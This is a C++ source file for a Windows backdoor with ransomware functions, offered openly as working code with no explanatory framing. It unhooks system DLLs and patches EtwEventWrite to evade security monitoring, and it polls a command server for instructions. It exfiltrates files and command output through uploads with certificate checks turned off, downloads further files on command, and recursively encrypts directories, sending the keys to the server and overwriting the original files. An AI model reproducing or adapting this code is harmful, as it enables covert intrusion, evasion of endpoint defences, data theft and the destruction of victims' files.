#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <thread>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <wincrypt.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#define _WIN32_WINNT 0x0501
#include <fstream>
#include <string>
#define BUFF_SIZE 4096
#define ENCRYPT_ALGORITHM CALG_AES_256
#define ENCRYPT_BLOCK_SIZE 16
#include <vector>
#include <random>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    IN HANDLE               ProcessHandle,
    IN OUT PVOID*           BaseAddress,
    IN OUT PSIZE_T          RegionSize,
    IN ULONG                NewProtect,
    OUT PULONG              OldProtect);
typedef NTSTATUS(NTAPI * NtClose_t)(HANDLE);


typedef HANDLE (WINAPI * CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI * MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL (WINAPI * UnmapViewOfFile_t)(LPCVOID);

unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sAdvapi32[] = { 'a','d','v','a','p','i','3','2','.','d','l','l', 0x0 };


// Function prototypes
std::string UrlEncode(const std::string& str);
bool PostData(const std::string& url, const std::string& data);
std::string SendHTTPRequest(const std::string& url);
void handleMessage(const std::string& response);
void RunEvery30Seconds();
std::vector<char> ReadFile(const char* filePath);
void HTTPUpload(const std::vector<char>& fileData, const char* filename);
void HTTPDownload(const char* host, const char* path, const char* filename, const char* downloadPath);
void writeToFile(const char* filepath, char* data, DWORD dataSize);
void encryptFile(const std::string& filename);
void processDirectory(const std::filesystem::path& directory);
int CheckETW(void);
static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping);
int MapandUnhook(LPCSTR filepath, LPCSTR moduleName);


int CheckETW(void) {
	DWORD oldprotect = 0;
	NtProtectVirtualMemory_t NtProtectVirtualMemory_p = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandle((LPCSTR) "ntdll"), (LPCSTR) "NtProtectVirtualMemory");
	
	unsigned char sEtwEventWrite[] = { 'E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 0x0 };
	
	void* pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)sEtwEventWrite);
	if (pEventWrite == NULL) {
		printf("Failed to get address of EtwEventWrite. Error: 0x%08x\n", GetLastError());
		return -1;
	}

	MEMORY_BASIC_INFORMATION mbi;
	if (!VirtualQuery(pEventWrite, &mbi, sizeof(MEMORY_BASIC_INFORMATION))) {
		printf("VirtualQuery failed. Error: 0x%08x\n", GetLastError());
		return -1;
	}

	NTSTATUS status = NtProtectVirtualMemory_p(GetCurrentProcess(), &(mbi.BaseAddress), &(mbi.RegionSize), PAGE_EXECUTE_READWRITE, &oldprotect);
	if (status != STATUS_SUCCESS) {
		printf("Failed to change memory protection. Error: 0x%08x\n", status);
		return -1;
	}

#ifdef _WIN64
	memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
#else
	memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14
#endif

	status = NtProtectVirtualMemory_p(GetCurrentProcess(), &(mbi.BaseAddress), &(mbi.RegionSize), oldprotect, &oldprotect);
	if (status != STATUS_SUCCESS) {
		printf("Failed to restore memory protection. Error: 0x%08x\n", status);
		return -1;
	}

	FlushInstructionCache(GetCurrentProcess(), pEventWrite, mbi.RegionSize);
	return 0;
}

static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
	int i;
	
	NtProtectVirtualMemory_t NtProtectVirtualMemory_p = (NtProtectVirtualMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) "ntdll"), (LPCSTR) "NtProtectVirtualMemory");
	
	SIZE_T size;
	PVOID addr;
	NTSTATUS status;
	
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
			addr = (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress);
			size = pImgSectionHead->Misc.VirtualSize;
			status = NtProtectVirtualMemory_p(GetCurrentProcess(), &addr, &size, PAGE_EXECUTE_READWRITE, &oldprotect);
			
			if (!NT_SUCCESS(status)) {
				printf("NTVirtProtect part 1 in Unhook failed");
				return -1;
			}

			memcpy((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
				   (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
				   pImgSectionHead->Misc.VirtualSize);

			status = NtProtectVirtualMemory_p(GetCurrentProcess(), &addr, &size, oldprotect, &oldprotect);

			if (!NT_SUCCESS(status)) {
				printf("NTVirtProtect part 2 in Unhook failed");
				return -1;
			}

			return 0;
		}
	}

	return -1;
}

int MapandUnhook(LPCSTR filepath, LPCSTR moduleName) {

	int ret = 0;
	HANDLE hFile; 
	HANDLE hFileMapping;
	LPVOID pMapping;
	
	CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFileMappingA);
	MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sMapViewOfFile);
	UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sUnmapViewOfFile);
    NtClose_t pNtClose = (NtClose_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtClose");

	
	//Need to make pointer for CreateFile

	hFile = CreateFile((LPCSTR) filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if ( hFile == INVALID_HANDLE_VALUE ) {
			return -1;
	}
	hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (! hFileMapping) {
			pNtClose(hFile);
			return -1;
	}
	pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
	if (!pMapping) {
					pNtClose(hFileMapping);
					pNtClose(hFile);
					return -1;
	}
	ret = UnhookNtdll(GetModuleHandle((LPCSTR) moduleName), pMapping);
	UnmapViewOfFile_p(pMapping);
	pNtClose(hFileMapping);
	pNtClose(hFile);
	return 0;
}

void encryptFile(const std::string& filename) {
    // Acquire a cryptographic context.
    HCRYPTPROV hProv;
    if (!CryptAcquireContext(&hProv, "MyContainer", NULL, PROV_RSA_AES, 0)) {
        if (GetLastError() == NTE_BAD_KEYSET) {
            if (!CryptAcquireContext(&hProv, "MyContainer", NULL, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
                std::cerr << "CryptAcquireContext error: " << GetLastError() << std::endl;
                return;
            }
        } else {
            std::cerr << "CryptAcquireContext error: " << GetLastError() << std::endl;
            return;
        }
    }
    
    // Generate the key.
    HCRYPTKEY hKey;
    if (!CryptGenKey(hProv, ENCRYPT_ALGORITHM, CRYPT_EXPORTABLE, &hKey)) {
        std::cerr << "CryptGenKey error: " << GetLastError() << std::endl;
        return;
    }

    // Export the key.
    DWORD keyLen;
    if (!CryptExportKey(hKey, NULL, PLAINTEXTKEYBLOB, 0, NULL, &keyLen)) {
        std::cerr << "CryptExportKey error (length): " << GetLastError() << std::endl;
        return;
    }
    std::vector<BYTE> keyBuffer(keyLen);
    if (!CryptExportKey(hKey, NULL, PLAINTEXTKEYBLOB, 0, keyBuffer.data(), &keyLen)) {
        std::cerr << "CryptExportKey error: " << GetLastError() << std::endl;
        return;
    }
    
	size_t fileSize = 0; 
		
    // Open the input file.
    std::ifstream inFile(filename, std::ios::binary);
    if (!inFile.is_open()) {
        std::cerr << "Unable to open file: " << filename << std::endl;
        return;
    } else {
        // Calculate file size
        inFile.seekg(0, std::ios::end);
        fileSize = inFile.tellg();
        inFile.seekg(0, std::ios::beg);
    }
    
    // Prepare the output file.
    std::filesystem::path filePath(filename);
	std::string keyOutputFilename = filePath.stem().string() + "_key.txt";
    std::string outputFilename = filePath.stem().string() + "_enc_bytes.txt";
    std::filesystem::path keyOutputFilePath = filePath.parent_path() / keyOutputFilename;
    std::filesystem::path outputFilePath = filePath.parent_path() / outputFilename;
    std::ofstream outFile(outputFilePath.string(), std::ios::binary);
    std::stringstream ssKey;
    std::stringstream ss;

    for (int i = 0; i < keyLen; i++) {
        ssKey << std::hex << std::setw(2) << std::setfill('0') << (int)keyBuffer[i];
    }
    ssKey << "\n";
	std::string ssKeyString = ssKey.str();
	std::vector<char> fileData(ssKeyString.begin(), ssKeyString.end());
	HTTPUpload(fileData, keyOutputFilePath.string().c_str());
	
    // Buffer for the data.
    std::vector<BYTE> buffer(ENCRYPT_BLOCK_SIZE);
    bool fEOF = false;

    while (!fEOF) {
        inFile.read(reinterpret_cast<char*>(buffer.data()), buffer.size());
        DWORD dwCount = inFile.gcount();
        if (dwCount < buffer.size()) fEOF = true;

        if (!CryptEncrypt(hKey, NULL, fEOF, 0, buffer.data(), &dwCount, buffer.size())) {
            std::cerr << "CryptEncrypt error: " << GetLastError() << std::endl;
            return;
        }

        // Convert to hexadecimal and write to the stringstream.
        for (DWORD i = 0; i < dwCount; i++) {
            ss << std::hex << std::setw(2) << std::setfill('0') << (int)buffer[i];
        }
    }

    ss << "\n";
    outFile << ss.str();

    std::cout << "Encrypted content of " << filename << " has been written to " << outputFilename << std::endl;

    // Clean up.
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
	
	
	// Close the input file stream
	inFile.close();
	
    // Overwrite the original file with 3 new files
    std::ofstream file1(filename, std::ios::binary);
    
    // Write 0's to the first file
    for (size_t i = 0; i < fileSize; i++) {
        file1.put(0);
    }
    
    file1.close();  // Close the output file stream

    std::ofstream file2(filename, std::ios::binary);
    
    // Write 1's to the second file
    for (size_t i = 0; i < fileSize; i++) {
        file2.put(1);
    }
    
    file2.close();  // Close the output file stream

    std::ofstream file3(filename, std::ios::binary);

    // Write random data to the third file
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(0, 255); // Range for a byte
    for (size_t i = 0; i < fileSize; i++) {
        file3.put(distr(gen));
    }

    file3.close();  // Close the output file stream
}

void processDirectory(const std::filesystem::path& directory) {
    if (!std::filesystem::exists(directory) || !std::filesystem::is_directory(directory)) {
        std::cerr << "Path is not a directory or does not exist: " << directory.string() << std::endl;
        return;
    }

    for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            std::string filename = entry.path().string();
            encryptFile(filename);
        }
    }
}

std::string UrlEncode(const std::string& str) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;

    for (char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
            continue;
        }

        escaped << std::uppercase;
        escaped << '%' << std::setw(2) << int((unsigned char) c);
        escaped << std::nouppercase;
    }

    return escaped.str();
}

bool PostData(const std::string& data) {
	
    DWORD flags =
        INTERNET_FLAG_RELOAD |       // reload
        INTERNET_FLAG_NO_CACHE_WRITE | // do not write the retrieved information into the cache
        INTERNET_FLAG_SECURE;       // use SSL
		
    HINTERNET internet, connect;
    //DWORD bytesRead;

    // Initialize WinINet
    internet = InternetOpen("Http Request", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (internet == NULL) {
        std::cerr << "InternetOpen failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Connect
    connect = InternetConnect(internet, "0.0.0.0", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (connect == NULL) {
        std::cerr << "InternetConnect failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Create request
    HINTERNET request = HttpOpenRequest(connect, "POST", "/", NULL, NULL, NULL, flags, 0);
    if (request == NULL) {
        std::cerr << "HttpOpenRequest failed. Error: " << GetLastError() << std::endl;
        return false;
    }
	
    // Set the flags to ignore SSL certificate errors
    DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID;

    if (!InternetSetOption(request, INTERNET_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags))) {
        std::cerr << "InternetSetOption failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Send request
    std::string formEncodedData = "output=" + data;
    BOOL isSent = HttpSendRequest(request, "Content-Type: application/x-www-form-urlencoded", -1, (LPVOID)formEncodedData.c_str(), formEncodedData.size());
    if (!isSent) {
        std::cout << "HttpSendRequest failed" << std::endl;
        InternetCloseHandle(request);
        InternetCloseHandle(connect);
        InternetCloseHandle(internet);
        return false;
    }

    // Clean up
    InternetCloseHandle(request);
    InternetCloseHandle(connect);
    InternetCloseHandle(internet);

    return true;
}

std::string SendHTTPRequest() {
    DWORD flags =
        INTERNET_FLAG_RELOAD |       // reload
        INTERNET_FLAG_NO_CACHE_WRITE | // do not write the retrieved information into the cache
        INTERNET_FLAG_SECURE;       // use SSL

    HINTERNET internet, connect;

    // Initialize WinINet
    internet = InternetOpen("Http Request", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (internet == NULL) {
        std::cerr << "InternetOpen failed. Error: " << GetLastError() << std::endl;
        return "";
    }

    // Connect
    connect = InternetConnect(internet, "0.0.0.0", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (connect == NULL) {
        std::cerr << "InternetConnect failed. Error: " << GetLastError() << std::endl;
        return "";
    }

    // Create request
    HINTERNET request = HttpOpenRequest(connect, "GET", "/", NULL, NULL, NULL, flags, 0);
    if (request == NULL) {
        std::cerr << "HttpOpenRequest failed. Error: " << GetLastError() << std::endl;
        return "";
    }

    // Set the flags to ignore SSL certificate errors
    DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;

    if (!InternetSetOption(request, INTERNET_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags))) {
        std::cerr << "InternetSetOption failed. Error: " << GetLastError() << std::endl;
        return "";
    }

    // Send request
    BOOL isSend = HttpSendRequest(request, NULL, 0, NULL, 0);
    if (!isSend) {
        std::cerr << "HttpSendRequest failed. Error: " << GetLastError() << std::endl;
        return "";
    }

    // Read and return the response data
    std::string response;
    char buffer[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(request, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        response.append(buffer, bytesRead);
    }

    // Clean up
    InternetCloseHandle(request);
    InternetCloseHandle(connect);
    InternetCloseHandle(internet);
	
    return response;

}

std::vector<char> ReadFile(const char* filePath)
{
    // Open file
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file)
    {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return {};
    }

    // Get the file size
    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // Read file into memory
    std::vector<char> fileData(fileSize);
    if (!file.read(fileData.data(), fileSize))
    {
        std::cerr << "Failed to read file: " << filePath << std::endl;
        return {};
    }

    return fileData;
}

void HTTPUpload(const std::vector<char>& fileData, const char* filename)
{
     DWORD flags =
        INTERNET_FLAG_RELOAD |       // reload
        INTERNET_FLAG_NO_CACHE_WRITE | // do not write the retrieved information into the cache
        INTERNET_FLAG_SECURE;       // use SSL
		
    HINTERNET internet, connect;
    //DWORD bytesRead;

    // Initialize WinINet
    internet = InternetOpen("Http Request", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (internet == NULL) {
        std::cerr << "InternetOpen failed. Error: " << GetLastError() << std::endl;
    }

    // Connect
    connect = InternetConnect(internet, "0.0.0.0", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (connect == NULL) {
        std::cerr << "InternetConnect failed. Error: " << GetLastError() << std::endl;
    }

    // Create request
    HINTERNET request = HttpOpenRequest(connect, "POST", "/upload", NULL, NULL, NULL, flags, 0);
    if (request == NULL) {
        std::cerr << "HttpOpenRequest failed. Error: " << GetLastError() << std::endl;
    }
	
    // Set the flags to ignore SSL certificate errors
    DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID;

    if (!InternetSetOption(request, INTERNET_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags))) {
        std::cerr << "InternetSetOption failed. Error: " << GetLastError() << std::endl;
    }

    // Prepare headers
    std::string headers =
        "Content-Type: multipart/form-data; boundary=boundary\r\n";

    // Prepare body
    std::string body =
        "--boundary\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"" + std::string(filename) + "\"\r\n"
        "Content-Type: application/octet-stream\r\n"
        "\r\n";

    body.append(fileData.begin(), fileData.end());
    body += "\r\n--boundary--\r\n";

    // Add headers
    if (!HttpAddRequestHeadersA(request, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE))
    {
        std::cerr << "HttpAddRequestHeadersA failed" << std::endl;
    }

    // Send Request
    if (!HttpSendRequestA(request, NULL, 0, (LPVOID)body.data(), body.length()))
    {
        std::cerr << "HttpSendRequestA failed" << std::endl;
    }

    // Cleanup
    InternetCloseHandle(request);
    InternetCloseHandle(connect);
    InternetCloseHandle(internet);
}

void HTTPDownload(const char* path, const char* filename, const char* downloadPath)
{
	
	    DWORD flags =
        INTERNET_FLAG_RELOAD |       // reload
        INTERNET_FLAG_NO_CACHE_WRITE | // do not write the retrieved information into the cache
        INTERNET_FLAG_SECURE;       // use SSL

    HINTERNET internet, connect;

    // Initialize WinINet
    internet = InternetOpen("Http Request", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (internet == NULL) {
        std::cerr << "InternetOpen failed. Error: " << GetLastError() << std::endl;
        return;
    }

    // Connect
    connect = InternetConnect(internet, "0.0.0.0", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (connect == NULL) {
        std::cerr << "InternetConnect failed. Error: " << GetLastError() << std::endl;
        return;
    }
	
	
	
    std::string fullPath = std::string(path) + "/" + filename;
	// Create request
    HINTERNET request = HttpOpenRequest(connect, "GET", fullPath.c_str(), NULL, NULL, NULL, flags, 0);
    if (request == NULL) {
        std::cerr << "HttpOpenRequest failed. Error: " << GetLastError() << std::endl;
        return;
    }

    // Set the flags to ignore SSL certificate errors
    DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;

    if (!InternetSetOption(request, INTERNET_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags))) {
        std::cerr << "InternetSetOption failed. Error: " << GetLastError() << std::endl;
        return;
    }


    // Send request
    BOOL isSend = HttpSendRequest(request, NULL, 0, NULL, 0);
    if (!isSend) {
        std::cerr << "HttpSendRequest failed. Error: " << GetLastError() << std::endl;
        return;
    }

    // Download the file
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(request, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
    {
        writeToFile(downloadPath, buffer, bytesRead);
    }

    // Clean up and close handles
    InternetCloseHandle(request);
    InternetCloseHandle(connect);
    InternetCloseHandle(internet);
}

void writeToFile(const char* filepath, char* data, DWORD dataSize)
{
    // Open the file in append mode
    std::ofstream file(filepath, std::ios::binary | std::ios::app);
    if (!file)
    {
        std::cerr << "Failed to open file" << std::endl;
        return;
    }

    // Write the data to the file
    file.write(data, dataSize);

    // Close the file
    file.close();
}

std::string pathInputFile, pathOutputFile;

void initializeTempFilePaths() {
    char tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    pathInputFile = std::string(tempPath) + "input.txt";
    pathOutputFile = std::string(tempPath) + "output.txt";
}

void writeInput(const std::string& filePath, const std::string& data) {
    std::ofstream outFile(filePath);
    outFile << data;
    outFile.close();
}

void deleteFile(const std::string& filePath) {
    std::remove(filePath.c_str());
}

bool fileExists(const std::string& filePath) {
    return std::filesystem::exists(filePath);
}

std::string readOutput(const std::string& filePath) {
    std::ifstream inFile(filePath);
    std::string output((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();
    return output;
}

bool getCommandFromServerAndWriteToFile(std::string& lastCmd) {

    std::string cmd = SendHTTPRequest();

    // Exit command
    if (cmd == "exit") {
        std::cout << "Exit command received. Terminating the program." << std::endl;
        writeInput(pathInputFile, cmd);
        return false;
    }

    // Check if the command is "upload"
    if (cmd.substr(0, 6) == "upload") {
        std::string filePath = cmd.substr(7);
        std::vector<char> fileData = ReadFile(filePath.c_str());
        if (!fileData.empty()) {
            size_t lastSlashPos = filePath.find_last_of("\\/");
            std::string filename = filePath.substr(lastSlashPos + 1);
            HTTPUpload(fileData, filename.c_str());
			return true;
        }
    }

    // Check if the command is a "download" command
    if (cmd.substr(0, 8) == "download") {
        size_t pos = cmd.find(" ", 9);
        if (pos == std::string::npos) {
            std::cerr << "Invalid command format. Use 'download <filename> <path>'" << std::endl;
            return true;
        }
        std::string filename = cmd.substr(9, pos - 9);
        std::string path = cmd.substr(pos + 1);
        HTTPDownload("/download", filename.c_str(), path.c_str());
		return true;
    }

    // Command for directory encryption
    if (cmd.substr(0, 5) == "crypt") {
        std::string directory = cmd.substr(6);
        processDirectory(directory);
		return true;
    }

    // Regular command
    else {
        writeInput(pathInputFile, cmd);
    }

    return true;
}

void readOutputFileAndPostData(std::string& lastOutput) {
    if (fileExists(pathOutputFile)) {
        std::string output = readOutput(pathOutputFile);

        if (output != lastOutput) {
            lastOutput = output;
            std::string encodedOutput = UrlEncode(output);
            //std::string url_post = "0.0.0.0";
            PostData(encodedOutput);
        }
    }
}

/*
extern "C" {
    __declspec(dllexport) int dll_main();  // Exported function
}
*/

int main() {
	
	MapandUnhook("c:\\windows\\system32\\ntdll.dll",(LPCSTR) sNtdll);
	MapandUnhook("c:\\windows\\system32\\kernel32.dll",(LPCSTR) sKernel32);
	MapandUnhook("c:\\windows\\system32\\advapi32.dll",(LPCSTR) sAdvapi32);

	CheckETW();

    initializeTempFilePaths();

    std::string lastCmd = "";
    std::string lastOutput = "";

    while (true) {
        if (!getCommandFromServerAndWriteToFile(lastCmd)) break;
        
        std::this_thread::sleep_for(std::chrono::seconds(10));
        readOutputFileAndPostData(lastOutput);
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }

    return 0;
}
/*
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
*/